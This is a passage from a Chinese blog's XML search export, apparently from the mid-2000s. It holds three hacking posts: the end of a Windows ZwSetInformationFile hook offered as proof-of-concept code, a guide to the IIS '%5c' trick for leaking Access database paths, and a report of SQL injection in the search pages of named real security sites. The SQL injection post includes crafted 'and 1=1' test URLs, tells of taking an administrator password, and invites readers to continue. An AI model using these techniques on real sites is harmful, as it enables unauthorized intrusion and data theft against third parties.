class="hljs-comment">// 11</span><br>FileNamesInformation, <span class="hljs-comment">// 12</span><br>FileDispositionInformation, <span class="hljs-comment">// 13</span><br>FilePositionInformation, <span class="hljs-comment">// 14 wdm</span><br>FileFullEaInformation, <span class="hljs-comment">// 15</span><br>FileModeInformation, <span class="hljs-comment">// 16</span><br>FileAlignmentInformation, <span class="hljs-comment">// 17</span><br>FileAllInformation, <span class="hljs-comment">// 18</span><br>FileAllocationInformation, <span class="hljs-comment">// 19</span><br>FileEndOfFileInformation, <span class="hljs-comment">// 20 wdm</span><br>FileAlternateNameInformation, <span class="hljs-comment">// 21</span><br>FileStreamInformation, <span class="hljs-comment">// 22</span><br>FilePipeInformation, <span class="hljs-comment">// 23</span><br>FilePipeLocalInformation, <span class="hljs-comment">// 24</span><br>FilePipeRemoteInformation, <span class="hljs-comment">// 25</span><br>FileMailslotQueryInformation, <span class="hljs-comment">// 26</span><br>FileMailslotSetInformation, <span class="hljs-comment">// 27</span><br>FileCompressionInformation, <span class="hljs-comment">// 28</span><br>FileObjectIdInformation, <span class="hljs-comment">// 29</span><br>FileCompletionInformation, <span class="hljs-comment">// 30</span><br>FileMoveClusterInformation, <span class="hljs-comment">// 31</span><br>FileQuotaInformation, <span class="hljs-comment">// 32</span><br>FileReparsePointInformation, <span class="hljs-comment">// 33</span><br>FileNetworkOpenInformation, <span class="hljs-comment">// 34</span><br>FileAttributeTagInformation, <span class="hljs-comment">// 35</span><br>FileTrackingInformation, <span class="hljs-comment">// 36</span><br>FileMaximumInformation<br><span class="hljs-comment">// begin_wdm</span><br>&#125; FILE_INFORMATION_CLASS, *PFILE_INFORMATION_CLASS;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">FILE_NAME_INFORMATION</span> &#123;</span><br>ULONG FileNameLength;<br>WCHAR FileName[<span class="hljs-number">1</span>];<br>&#125; FILE_NAME_INFORMATION, *PFILE_NAME_INFORMATION;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-title function_">NTSTATUS</span> <span class="hljs-params">(__stdcall *ZWQUERYINFORMATIONFILE)</span><span class="hljs-params">(</span><br><span class="hljs-params">IN HANDLE FileHandle,</span><br><span class="hljs-params">OUT PIO_STATUS_BLOCK IoStatusBlock,</span><br><span class="hljs-params">OUT PVOID FileInformation,</span><br><span class="hljs-params">IN ULONG FileInformationLength,</span><br><span class="hljs-params">IN FILE_INFORMATION_CLASS FileInformationClass</span><br><span class="hljs-params">)</span>;<br><br>ZWQUERYINFORMATIONFILE ZwQueryInformationFile;<br><br>NTSTATUS __stdcall <span class="hljs-title function_">Hook_ZwSetInformationFile</span><span class="hljs-params">(IN HANDLE FileHandle,</span><br><span class="hljs-params">OUT PIO_STATUS_BLOCK IoStatusBlock,</span><br><span class="hljs-params">IN PVOID FileInformation,</span><br><span class="hljs-params">IN ULONG FileInformationLength,</span><br><span class="hljs-params">IN FILE_INFORMATION_CLASS FileInformationClass)</span><br>&#123;<br>NTSTATUS ntstatus = STATUS_ACCESS_DENIED;<br><br>HMODULE hNtdll = GetModuleHandle(<span class="hljs-string">&quot;ntdll.dll&quot;</span>);<br>ZwQueryInformationFile = (ZWQUERYINFORMATIONFILE)GetProcAddress(hNtdll, <span class="hljs-string">&quot;ZwQueryInformationFile&quot;</span>);<br><br>IO_STATUS_BLOCK ioStatus;<br>FILE_NAME_INFORMATION * psi = &#123;<span class="hljs-number">0</span>&#125;;<br><br>psi = (FILE_NAME_INFORMATION*)new WCHAR[<span class="hljs-keyword">sizeof</span>(FILE_NAME_INFORMATION) + <span class="hljs-number">1024</span>];<br><span class="hljs-built_in">memset</span>(psi, <span class="hljs-number">0</span>, (<span class="hljs-keyword">sizeof</span>(FILE_NAME_INFORMATION) + <span class="hljs-number">1024</span>)*<span class="hljs-number">2</span>);<br>psi-&gt;FileNameLength = <span class="hljs-number">1024</span>;<br><br>ntstatus = ZwQueryInformationFile(FileHandle, &amp;ioStatus, psi, <span class="hljs-keyword">sizeof</span>(FILE_NAME_INFORMATION) + <span class="hljs-number">1024</span> * <span class="hljs-keyword">sizeof</span>(WCHAR),<br><br>FileNameInformation);<br><br><span class="hljs-keyword">if</span> (ntstatus != STATUS_SUCCESS)<br>PrintZwError(<span class="hljs-string">&quot;ZwQueryInformationFile&quot;</span>, ntstatus);<br><br>ntstatus = STATUS_ACCESS_DENIED;<br><br><span class="hljs-keyword">if</span>( wcsstr(psi-&gt;FileName, <span class="hljs-string">L&quot;b.txt&quot;</span>) == <span class="hljs-literal">NULL</span>)<br>ntstatus = ((PFZWSETINFORMATIONFILE)(PROC)g_ZwSetInformationFile)<br><br>(FileHandle,IoStatusBlock,FileInformation,FileInformationLength,FileInformationClass);<br><br>delete psi;<br><span class="hljs-keyword">return</span> ntstatus;<br><br><br>&#125;<br></code></pre></td></tr></table></figure><p>这只是一个证明性代码，要实战的兄弟自己动点手吧。</p>]]></content>
    
    
    
    <tags>
      
      <tag>windows</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>N 谈 %5C 暴库</title>
    <link href="/cn/5cAcessPath/"/>
    <url>/cn/5cAcessPath/</url>
    
    <content type="html"><![CDATA[<p>关于%5c的暴库利用想已经不是什么新技术了，原因我只找到含糊的说法：的UNICODE是%5c当提交时,IIS无法正常解析,导致暴库。但我对 <a href="http://www.hoky.org/">http://www.hoky.org</a> 测试成功后（现在已经补上）问过hoky.pro，得知%5c与IIS的设置是有关系的。而在默认设置下是可以暴库的。还有很多人说不成功，我要说的三点：</p><ol><li>一般的错误返回页面是本地IE提供的,所以我们先得关了本地的错误页面,具体在菜单项的‘工具-&gt;internet选项-&gt;高级-&gt;显示友好信息’。</li><li>对方数据库要是Access型。</li><li>%5c的暴库需要的是二级目录，一级目录无法成功。如：</li></ol><p><a href="http://www.sometips.com%5c1.asp?id=1">http://www.sometips.com%5c1.asp?id=1</a> 不成功<br><a href="http://www.sometips.com/other%5c1.asp?id=1">http://www.sometips.com/other%5c1.asp?id=1</a> 成功</p><p>好了，上面说的大家都知道，当是废话。在暴库这么好用的东西下，如果一个网站只有一级目录的话，难道就没有办法了吗？说到重点，其实一级目录我们也同样可以成功的，我们可以通过构造一个多级目录来达到暴库的目的。</p><p><a href="http://www.target.com/noexists/..%5clist.asp?id=1">http://www.target.com/noexists/..%5clist.asp?id=1</a></p><p>这样大家就会有新的惊喜了，呵呵。</p><p>补救方法也很简单，在conn.asp里 加入数据库文件的位置后面加上这句：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asp">On Error Resume Next<br></code></pre></td></tr></table></figure><p>就可以了。</p><hr><p>今天在黑基又看到了关于％5c暴库的文章，这招真的很管用，大概10个网站里会有一个会暴库吧。</p><p>关于这个漏洞。绿盟有相关的资料：<br><a href="http://www.nsfocus.net/index.php?act=magazine&do=view&mid=952">http://www.nsfocus.net/index.php?act=magazine&amp;do=view&amp;mid=952</a></p><p>呵呵。虽然这个我们这个漏洞呵暴库关系不是很大， 但是明眼人还是看的出相关的地方，IIS 二次解码。大家知道在 url中 <code>\</code> 和 <code>/</code> 是一样的，也就是说 <a href="http://www.example.com/abc/123.asp?id=5">http://www.example.com/abc/123.asp?id=5</a> 和 <a href="http://www.example.com/abc/123.asp?id=5">http://www.example.com/abc\123.asp?id=5</a> 是一样的。</p><p>而 <a href="http://www.example.com/abc%5c123.asp?id=5">http://www.example.com/abc%5c123.asp?id=5</a> 经过一次解码后变成 <a href="http://www.example.com/abc/123.asp?id=5">http://www.example.com/abc\123.asp?id=5</a> 这里是不会出错的。</p><p>而经过 IIS 二次解码后就变成 <a href="http://www.example.com/abc%5c123.asp?id=5">http://www.example.com/abc%5c123.asp?id=5</a>, 如果数据库连接文件用的相对路径的话。HOO, 找不到数据库文件，当然就出错了。还很老实呢，连物理路径都出来了。大家看。</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs 1c">Microsoft JET Database Engine 错误 &#x27;<span class="hljs-number">80004005</span>&#x27;<br><br>&#x27;D:\wwwroot\hell\wwwroot\data\abc.asp&#x27;不是一个有效的路径。 确定路径名称拼写是否正确，以及是否连接到文件存放的服务器。<br><br>/blog/conn.asp，行<span class="hljs-number">29</span><br></code></pre></td></tr></table></figure><p>这个是我暴 Oblog 暴出来的，这个月的黑防大家都有看吧。(早知道我也去投稿了，我发现的比他早多了，郁闷)<br>很多人都在分析成功的条件，就象itbbs里的人讨论的一样。(itbbs最近我怎么上不去啊，知道告诉我)</p><p>sykkk 认为：</p><ol><li>是数据库连接中没有加入容错代码 所以导致错误不能跳过而活生生的把数据文件连接暴出来</li><li>对方的IIS没有关闭错误提示 只要关了错误提示就算你怎么暴也没有用</li><li>不一定要2级目录 可以自己够造个noexists&#x2F;..%5C的2级目录</li><li>还有就是 要成功一定要调用到数据库 不一定是5c1.asp?id&#x3D;1 这种类别的</li></ol><p>其实还有一个必要条件他忘了，数据库要相对路径，绝对路径是暴不出来的。还有我补充一点应该是 IIS 4.0 或者 IIS 5.0 ，IIS 6 应该是不行了。</p><p>关于二级目录，我同意sykkk的看法，有的人说一定是二级目录，呵呵，我可以告诉大家那是错误的。应该是最靠近的asp文件的那个 “&#x2F;“ 改成 “%5c”, 只有有调用数据库都有可能暴库。哈哈，还有当然对方要没有屏蔽错误信息，要不然你是肯定看不到的。</p><p>总结：％5c暴库成功条件</p><ol><li>对方服务器用的是 IIS 4.0 或 IIS 5.0， 并且没有屏蔽错误信息。</li><li>是数据库连接中没有加入容错代码 所以导致错误不能跳过而活生生的把数据文件连接暴出来 (On Error Resume Next)</li><li>应该是Microsoft JET Database Engine 方式</li><li>数据库文件调用用的是相对路径！！</li></ol><p>不一定要求是二级目录。三级也是可以的(我有成功过), 二级目录有时候反倒没成功。至于还有构造二级目录，我是没成功过，嘿嘿，应该是错误的。：）</p><p>随便也告诉大家，aspx %5c 也有文章的，运用也很巧妙，想知道就 google吧。^_^</p>]]></content>
    
    
    
    <tags>
      
      <tag>Security</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>站内搜索写法的一个 SQL inject 漏洞</title>
    <link href="/cn/search_sql_injection/"/>
    <url>/cn/search_sql_injection/</url>
    
    <content type="html"><![CDATA[<p>最近sql inject 可是说是红遍了整个中国，不知道多少网站在sql inject 面前轰然倒下，其实 Sql inject 在国外技术已经很成熟了，而国内则是在近一两年内慢慢走向成熟。在一个个惨痛的实例面前，脚本工作者不得不重视起来，最好的例子就是动网了。然而今天脚本是不是就很安全的呢。请看我对几个安全站点的测试结果。结果是令人吃惊的， 影子鹰， 华夏， 黑客动画吧 都存在着这个站内搜索的漏洞。</p><p>请看一段常见的站内搜索写法。</p><p>例一：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;form4&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;post&quot;</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;search.asp&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">td</span> <span class="hljs-attr">height</span>=<span class="hljs-string">&quot;25&quot;</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">align</span>=<span class="hljs-string">center</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;txtfind&quot;</span> <span class="hljs-attr">size</span>=<span class="hljs-string">&quot;18&quot;</span> <span class="hljs-attr">onMouseOver</span>=<span class="hljs-string">&quot;javascript:this.select();&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;请输入待查信息&quot;</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;border:#333333 1px solid;&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">align</span>=<span class="hljs-string">center</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">height</span>=<span class="hljs-string">5</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;../images/left_2.gif&quot;</span> <span class="hljs-attr">width</span>=<span class="hljs-string">186</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">td</span> <span class="hljs-attr">height</span>=<span class="hljs-string">&quot;30&quot;</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">align</span>=<span class="hljs-string">center</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">select</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;s1&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">option</span> <span class="hljs-attr">selected</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&#x27;0&#x27;</span>&gt;</span>所有类别<span class="hljs-tag">&lt;/<span class="hljs-name">option</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">option</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&#x27;1&#x27;</span>&gt;</span>网站新闻<span class="hljs-tag">&lt;/<span class="hljs-name">option</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">option</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&#x27;2&#x27;</span>&gt;</span>进阶教程<span class="hljs-tag">&lt;/<span class="hljs-name">option</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">option</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&#x27;3&#x27;</span>&gt;</span>安全漏洞<span class="hljs-tag">&lt;/<span class="hljs-name">option</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">option</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&#x27;5&#x27;</span>&gt;</span>系统防范<span class="hljs-tag">&lt;/<span class="hljs-name">option</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">option</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&#x27;6&#x27;</span>&gt;</span>原创作品<span class="hljs-tag">&lt;/<span class="hljs-name">option</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span><br></code></pre></td></tr></table></figure><p>上面的这段来自影子鹰安全网, 也许看了人说没什么的啊，我也是这么写的，这和sql inject 有什么关系啊。<br>其实问题就出在这, 搜索类别的值是从客户端获得的，而且没有过滤。那么聪明的你是否想到了什么？</p><p>我们可以构造一个url  <code>http://www.cnhacker.cn/search.asp?s1=1</code>  得到的结果是：</p><p>页面返回正常，得到一大堆的搜索结果。</p><p>提交 <code>http://www.cnhacker.cn/search.asp?s1=1 and 1＝1</code> 返回正常<br>提交 <code>http://www.cnhacker.cn/search.asp?s1=1 and 1＝2</code> 没有搜索到任何相关文章 ，请重新搜索</p><p>哈哈，可以注入！像这些安全站点密码一定n变态，还是用nb跑跑吧。后面也证明了我的想法是正确的密码n变态，还好没手工猜。拿到了管理员的密码，就是找不到后台郁闷。</p><p>例二：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&#x27;Soft_Class.asp?ClassID=11&#x27;</span>&gt;</span>安全扫描<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&#x27;Soft_Class.asp?ClassID=12&#x27;</span>&gt;</span>嗅探监听<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&#x27;Soft_Class.asp?ClassID=13&#x27;</span>&gt;</span>分析检测<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&#x27;Soft_Class.asp?ClassID=14&#x27;</span>&gt;</span>字典文档<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&#x27;Soft_Class.asp?ClassID=15&#x27;</span>&gt;</span>加密破解<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&#x27;Soft_Class.asp?ClassID=16&#x27;</span>&gt;</span>木马类<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&#x27;Soft_Class.asp?ClassID=17&#x27;</span>&gt;</span>QQ类<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&#x27;Soft_Class.asp?ClassID=18&#x27;</span>&gt;</span>综合工具<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br></code></pre></td></tr></table></figure><p>上面代码来自黑客动画吧，令人吃惊的直接就是<code>classID=</code> 根本就没有过滤。分析完上面的代码，和其他的一些代码综合起来, 我们又可以构造这样的url:</p><p><a href="http://www.hack58.com/Soft_Search.asp?Field=SoftName&ClassID=8">http://www.hack58.com/Soft_Search.asp?Field=SoftName&amp;ClassID=8</a></p><p>结果返回也是一定堆的搜索结果。。。</p><p>提交 <code>http://www.hack58.com/Soft_Search.asp?Field=SoftName&amp;ClassID=8 and 1＝1</code> 返回正常<br>提交 <code>http://www.hack58.com/Soft_Search.asp?Field=SoftName&amp;ClassID=8 and 1＝2</code> 产生错误的可能原因：</p><p>HOO，漏洞又出来了！</p><p>例三：</p><p>来个大家都知道的华夏黑客联盟，前段时间还被黑了一次。还是看代码吧，听说华夏用的是动力的商业版。可以华夏今天又上不去，反正原理是相同的。我把我构造好的url 给大家看  </p><p><code>http://www.77169.org/soft1/search.asp?ss_name=winrar&amp;sor=01</code></p><p>接下来要怎么发挥就看你们的了。</p><p>总结：这个漏洞应该有一定的普遍性，黑窝里安全站点都有这个问题，更别说是其他站点了。或许有些大虾早就发现了，<br>小弟就在这献丑一下了，第一次写文章，有所差错在所难免，欢迎和我联系。</p>]]></content>
    
    
    
    <tags>
      
      <tag>Security</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
